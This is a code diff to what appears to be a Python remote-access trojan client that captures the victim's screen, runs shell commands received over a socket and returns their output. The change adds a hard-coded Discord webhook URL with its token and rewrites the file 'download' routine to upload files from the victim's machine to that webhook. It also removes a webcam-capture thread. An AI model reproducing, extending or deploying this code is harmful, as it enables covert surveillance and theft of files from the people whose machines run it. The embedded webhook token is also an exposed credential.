@@ -4,9 +4,12 @@ import threading
 import pyautogui
 import cv2
 import numpy as np
+import requests
 from PyQt5.QtWidgets import QApplication, QWidget
 from PyQt5.QtCore import QThread, pyqtSignal
 from PyQt5.QtGui import QImage, QPixmap
+
+DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2'
 
 class ScreenShareThread(QThread):
     change_pixmap_signal = pyqtSignal(np.ndarray)
@@ -17,17 +20,6 @@ class ScreenShareThread(QThread):
             frame = np.array(screenshot)
             frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
             self.change_pixmap_signal.emit(frame)
-
-class WebcamThread(QThread):
-    change_pixmap_signal = pyqtSignal(np.ndarray)
-
-    def run(self):
-        cap = cv2.VideoCapture(0)
-        while True:
-            ret, frame = cap.read()
-            if ret:
-                self.change_pixmap_signal.emit(frame)
-        cap.release()
 
 class Client(QWidget):
     def __init__(self, host, port):
@@ -88,13 +80,24 @@ class Client(QWidget):
         self.socket.sendall(result.stdout.encode('utf-8'))
 
     def download_file(self, filename):
-        with open(filename, 'rb') as file:
-            data = file.read()
-            self.socket.sendall(data)
-            print("[ * ] Sending...")
-            print("[+] Sent!")
+        try:
+            with open(filename, 'rb') as file:
+                data = file.read()
+                print("[ * ] Sending...")
+                response = requests.post(
+                    DISCORD_WEBHOOK_URL,
+                    files={filename: data}
+                )
+                if response.status_code == 204:
+                    print("[+] Sent!")
+                else:
+                    print("[-] Failed to send!")
+            self.socket.sendall(b'[+] Sent!')
+        except Exception as e:
+            print(f"Error sending file: {e}")
+            self.socket.sendall(b'[-] Failed to send!')
 
 if __name__ == "__main__":
     app = QApplication(sys.argv)
-    client = Client('10.0.1.33', 9999)
+    client = Client('0.0.0.0', 9999)
     sys.exit(app.exec_())
